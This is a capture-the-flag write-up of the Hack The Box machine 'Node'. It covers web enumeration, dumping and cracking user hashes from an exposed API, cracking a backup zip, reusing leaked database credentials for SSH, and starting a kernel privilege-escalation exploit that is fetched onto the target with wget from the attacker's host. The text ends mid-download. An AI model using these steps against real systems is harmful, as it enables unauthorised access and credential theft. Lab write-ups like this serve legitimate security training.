# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# nmap -sC -sV -A -p- 10.10.10.58
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 10:04 +08
Nmap scan report for 10.10.10.58
Host is up (0.0031s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   3.17 ms 10.10.14.1
2   3.27 ms 10.10.10.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.36 seconds
```

It seems like there’s a website open on port `3000`.

Let’s check it out!

![website](website.png)

![login](login.png)

I tried some basic SQL injections here but nothing seemed to work.

So let’s check for hidden directories then!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# gobuster dir -u http://10.10.10.58:3000 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.58:3000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/17 10:08:47 Starting gobuster in directory enumeration mode
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.58:3000/694d3110-f3f2-4e8f-9a52-68782669e22b => 200 (Length: 3861). To continue please exclude the status code, the length or use the --wildcard switch
```

Interestingly, `gobuster` doesn’t work because non-existing urls are returning status 200.

Let’s try using another tool then.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# feroxbuster -u http://10.10.10.58:3000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.58:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET       90l      249w     3861c Got 200 for http://10.10.10.58:3000/4c76ed1c523d46309cda2fbef1e50976 (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 3861 responses; toggle this behavior by using --dont-filter
WLD      GET       90l      249w     3861c Got 200 for http://10.10.10.58:3000/de58e5bda0a64c31be9b174b9587b584847e222daada44f7995c62bfcd8110a0afbe4f822dfd40948796e42e81456751 (url length: 96)
301      GET        9l       15w      173c http://10.10.10.58:3000/uploads => /uploads/
301      GET        9l       15w      171c http://10.10.10.58:3000/assets => /assets/
301      GET        9l       15w      177c http://10.10.10.58:3000/assets/js => /assets/js/
301      GET        9l       15w      179c http://10.10.10.58:3000/assets/css => /assets/css/
301      GET        9l       15w      187c http://10.10.10.58:3000/assets/js/misc => /assets/js/misc/
301      GET        9l       15w      185c http://10.10.10.58:3000/assets/js/app => /assets/js/app/
301      GET        9l       15w      209c http://10.10.10.58:3000/assets/js/app/controllers => /assets/js/app/controllers/
301      GET        9l       15w      171c http://10.10.10.58:3000/vendor => /vendor/
301      GET        9l       15w      185c http://10.10.10.58:3000/vendor/jquery => /vendor/jquery/
301      GET        9l       15w      175c http://10.10.10.58:3000/partials => /partials/
[####################] - 3m    330000/330000  0s      found:12      errors:0      
[####################] - 3m     30002/30000   149/s   http://10.10.10.58:3000 
[####################] - 3m     30000/30000   149/s   http://10.10.10.58:3000/ 
[####################] - 3m     30000/30000   148/s   http://10.10.10.58:3000/uploads 
[####################] - 3m     30000/30000   148/s   http://10.10.10.58:3000/assets 
[####################] - 3m     30000/30000   148/s   http://10.10.10.58:3000/assets/js 
[####################] - 3m     30000/30000   148/s   http://10.10.10.58:3000/assets/css 
[####################] - 3m     30000/30000   148/s   http://10.10.10.58:3000/assets/js/misc 
[####################] - 3m     30000/30000   148/s   http://10.10.10.58:3000/assets/js/app 
[####################] - 3m     30000/30000   150/s   http://10.10.10.58:3000/vendor 
[####################] - 3m     30000/30000   152/s   http://10.10.10.58:3000/vendor/jquery 
[####################] - 2m     30000/30000   183/s   http://10.10.10.58:3000/partials 
```

There is an interesting `/uploads` path but it redirects us back to us `/`.

At this point we can only use our browser’s dev tools and hope that we find something interesting.

![devtools](devtools.png)

Yay! We found some JavaScript files.

###### app.js

```js
var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});
```

`app.js` seems to define the different routes for the website.

###### home.js

```js
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

`home.js` seems to be grabbing the users data from the `/api/users/latest` endpoint.

###### login.js

```js
var controllers = angular.module('controllers');

controllers.controller('LoginCtrl', function ($scope, $http, $location) {
  $scope.authenticate = function () {
    $scope.hasError = false;

    $http.post('/api/session/authenticate', {
      username: $scope.username,
      password: $scope.password
    }).then(function (res) {
      if (res.data.success) {
        $location.path('/admin');
      }
      else {
        $scope.hasError = true;
        $scope.alertMessage = 'Incorrect credentials were specified';
      }
    }, function (resp) {
      $scope.hasError = true;
      $scope.alertMessage = 'An unexpected error occurred';
    });
  };
});
```

`login.js` has some standard login functions with authentication performed.

###### admin.js

```js
var controllers = angular.module('controllers');

controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }

  $http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

`admin.js` has 2 endpoints - `/api/admin/backup` and `/api/session`.

###### profile.js

```js
var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```

`profile.js` seems to grabbing profiles from the `/api/users/{username}` endpoint.

Let’s check out the `/api/users/latest` endpoint for any interesting information.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# curl -s 10.10.10.58:3000/api/users/latest | jq 
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

There seems to be 3 users listed but none of them are admins.

Perhaps the admin profile is hidden somewhere else?

Let’s try going back one directory from `api/users/latest` to `/api/users`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# curl -s 10.10.10.58:3000/api/users/ | jq       
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

Yay! We found a user with admin privileges.

Let’s grab the password field for each user.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# curl -s 10.10.10.58:3000/api/users/ | jq -r '.[].password'
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

>   `-r` - raw output
>
>   `.[]` - array/object value iterator
>
>   `.password` - object identifier

Let’s try to crack the hashes using an online tool - [CrackStation](https://crackstation.net/).

![cracked_hashes](cracked_hashes.png)

So here are the credentials that we gathered so far.

```
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
rastating:-
```

# Exploitation

Let’s try logging in as `myP14ceAdm1nAcc0uNT`!

![admin_login](admin_login.png)

There seems to be a backup file of some sort.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ls                 
myplace.backup
                                  
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# file myplace.backup 
myplace.backup: ASCII text, with very long lines (65536), with no line terminators
```

When I viewed the last few lines of the file, it seems to be a base64 encoded file.

So let’s try decoding it!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# cat myplace.backup | base64 -d > decoded    
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# file decoded    
decoded: Zip archive data, at least v1.0 to extract, compression method=store

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# mv decoded decoded.zip 
```

Oh? It’s a zip file! Let’s unzip it.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# unzip decoded.zip
Archive:  decoded.zip
   creating: var/www/myplace/
[decoded.zip] var/www/myplace/package-lock.json password: 
```

It seems like the file is password protected.

So, lets use `john` to crack the password!

```
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# zip2john decoded.zip > hash.txt

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# cat hash.txt 
decoded.zip:$pkzip$8*1*1*0*0*11*2938*a962347cdbe72d4ed125843ad846bfd166*1*0*0*17*996a*f0a37158ac0cea162037edb5e546b7abab836f4712459f*1*0*0*19*5083*0c01e83e6427b5aaecd0cba454f984f7ec9ffd96909443b598*1*0*0*1f*b16f*57fa3f629c4c8e1cbcc0a0f4c46019a45bfaa0813fc3d6979c7256df612625*1*0*0*24*a3cc*34b314682b87c1d56d933ebdf5ca0acb415adaad3b992c117a955b54a2a748ff36f4bc6c*1*0*8*24*5083*3a64f9cb8371809588f31a59f2697564d765b498a6343eab86922e8c7b2bc3b6ab447177*1*0*0*24*9679*de3c8b1f8248cd74d3508eca6412bb98a814cfa3e9fa1f3527fcc546d0bebf8c44605246*2*0*11*5*118f1dfc*94cb*67*0*11*3d0f*76eea9fd60423320aca2ecd7e98b08bc30*$/pkzip$::decoded.zip:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/express/node_modules/qs/.eslintignore, var/www/myplace/node_modules/string_decoder/.npmignore, var/www/myplace/node_modules/isarray/.npmignore, var/www/myplace/node_modules/ipaddr.js/.npmignore, var/www/myplace/node_modules/cookie-signature/.npmignore, var/www/myplace/node_modules/isarray/.travis.yml, var/www/myplace/node_modules/debug/node.js:decoded.zip

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (decoded.zip)     
1g 0:00:00:00 DONE (2022-05-17 11:08) 33.33g/s 6280Kp/s 6280Kc/s 6280KC/s sandriux..beckyg
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password is `magicword` and now we can unzip the file.

After unzipping the file, there were a lot of files to check.

Instead, I used `grep` to find any files that had `password` in it.

```bash
┌──(root㉿shiro)-[/home/…/Node/var/www/myplace]
└─# grep -ril "password"
static/vendor/jquery/jquery.min.js
static/vendor/jquery/jquery.js
static/vendor/angular/angular.min.js
static/assets/js/app/controllers/login.js
static/partials/login.html
app.js
node_modules/mongodb-core/lib/auth/gssapi.js
node_modules/mongodb-core/lib/auth/mongocr.js
node_modules/mongodb-core/lib/auth/plain.js
node_modules/mongodb-core/lib/auth/scram.js
node_modules/mongodb-core/lib/auth/x509.js
node_modules/mongodb-core/lib/auth/sspi.js
node_modules/mongodb-core/HISTORY.md
node_modules/safe-buffer/README.md
node_modules/mongodb/lib/mongos.js
node_modules/mongodb/lib/server.js
node_modules/mongodb/lib/admin.js
node_modules/mongodb/lib/replset.js
node_modules/mongodb/lib/db.js
node_modules/mongodb/lib/url_parser.js
node_modules/mongodb/lib/authenticate.js
node_modules/mongodb/lib/mongo_client.js
node_modules/mongodb/HISTORY.md
node_modules/express/History.md
node_modules/express/package.json
```

>   `-r` - search recursively
>
>   `-i` - ignore case in patterns and data
>
>   `-l` - print only names of the files with selected lines

`app.js` was the file that stands out the most among all the files searched.

```js
┌──(root㉿shiro)-[/home/…/Node/var/www/myplace]
└─# cat app.js

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  app.use(session({
    secret: 'the boundless tendency initiates the law.',
    cookie: { maxAge: 3600000 },
    resave: false,
    saveUninitialized: false
  }));

  app.use(function (req, res, next) {
    var agent = req.headers['user-agent'];
    var blacklist = /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;

    if (!blacklist.test(agent)) {
      next();
    }
    else {
      count = Math.floor((Math.random() * 10000) + 1);
      randomString = '';

      var charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (var i = 0; i < count; i++)
        randomString += charset.charAt(Math.floor(Math.random() * charset.length));

      res.set('Content-Type', 'text/plain').status(200).send(
        [
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQP\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ',
          'QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ',
          'QQQQQQQQQQW\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ',
          'QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ',
          'QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ',
          'QQQQQQQP\'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ',
          'QQQQQP\'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP\'    "??\' =QQmWWV?46/ ?QQQQQ',
          'QQQP\'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ',
          'QQ[ j@mQP\'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ',
          'QW jQkQ@ jWQQD\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ',
          'QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ',
          'QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ',
          'QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\'<mWWWWWQW?^  ` ]6QQ\' yQQQQQ',
          'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ',
          'QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',
          'QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ',
          'QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ',
          'QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',
          'QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',
          'QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',
          'QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',
          'QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ',
          'QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',
          'QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW',
          'QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ',
          'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ',
          'QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ',
          '',
          '',
          '<!-- ' + randomString + ' -->'
        ].join("\n")
      );
    }
  });

  app.use(express.static(path.join(__dirname, 'static')));
  app.use(bodyParser.json());
  app.use(function(err, req, res, next) {
    if (err) {
      res.status(err.status || 500);
      res.send({
        message:"Uh oh, something went wrong!",
        error: true
      });
    }
    else {
      next();
    }
  });

  app.get('/api/users/?', function (req, res) {
    db.collection('users').find().toArray(function (error, docs) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!docs) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(docs);
      }
    });
  });

  app.get('/api/users/latest', function (req, res) {
    db.collection('users').find({ is_admin: false }).toArray(function (error, docs) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!docs) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(docs);
      }
    });
  });

  app.get('/api/users/:username', function (req, res) {
    db.collection('users').findOne({ username: req.params.username }, function (error, doc) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!doc) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(doc);
      }
    });
  });

  app.get('/api/session', function (req, res) {
    if (req.session.user) {
      res.send({
        authenticated: true,
        user: req.session.user
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.post('/api/session/authenticate', function (req, res) {
    var failureResult = {
      error: true,
      message: 'Authentication failed'
    };

    if (!req.body.username || !req.body.password) {
      res.send(failureResult);
      return;
    }

    db.collection('users').findOne({ username: req.body.username }, function (error, doc) {
      if (error) {
        res.status(500).send({
          message:"Uh oh, something went wrong!",
          error: true
        });

        return;
      }

      if (!doc) {
        res.send(failureResult);
        return;
      }

      var hash = crypto.createHash('sha256');
      var cipherText = hash.update(req.body.password).digest('hex');

      if (cipherText == doc.password) {
        req.session.user = doc;
        res.send({
          success: true
        });
      }
      else {
        res.send({
          success: false
        })
      }
    });
  });

  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.use(function(req, res, next){
    res.sendFile('app.html', { root: __dirname });
  });

  app.listen(3000, function () {
    console.log('MyPlace app listening on port 3000!')
  });

});
```

Here, I noticed that `mark:5AYRft73VtFpc84k` seems to be a possible credential used for `ssh`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ssh mark@10.10.10.58                       
The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.58' (ED25519) to the list of known hosts.
mark@10.10.10.58's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ whoami
mark
mark@node:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
mark@node:~$ uname -a && uname -m && lsb_release -a
Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
x86_64
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.3 LTS
Release:	16.04
Codename:	xenial
```

# Privilege Escalation

## Unintended Way

Since we know what version the machine is running on, we can do a simple `searchsploit` to search for known exploits.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# searchsploit Ubuntu 16.04 Privilege Escalation
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                       | linux/local/40054.c
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation           | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / Ce | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso | linux_x86/local/42276.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)     | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privile | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds  | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condit | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege E | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalat | linux/local/40489.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation       | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation              | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privil | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalat | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Loc | linux/local/47169.c
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

From the results, it looks like `45010.c` has what we want.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# searchsploit -m 45010
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
File Type: C source, ASCII text

Copied to: /home/shiro/HackTheBox/Node/45010.c
```

Taking a look at the source code, it seems like we just have to execute the code on the SSH shell to gain root access.

```bash
- Local Machine -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# gcc 45010.c -o 45010   

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# python3 -m http.server 80

- SSH Shell -
mark@node:~$ cd /tmp
mark@node:/tmp$ wget http://10.10.14.3/45010 .
--2022-05-17 04:38:35--  http://10.10.14.3/45010
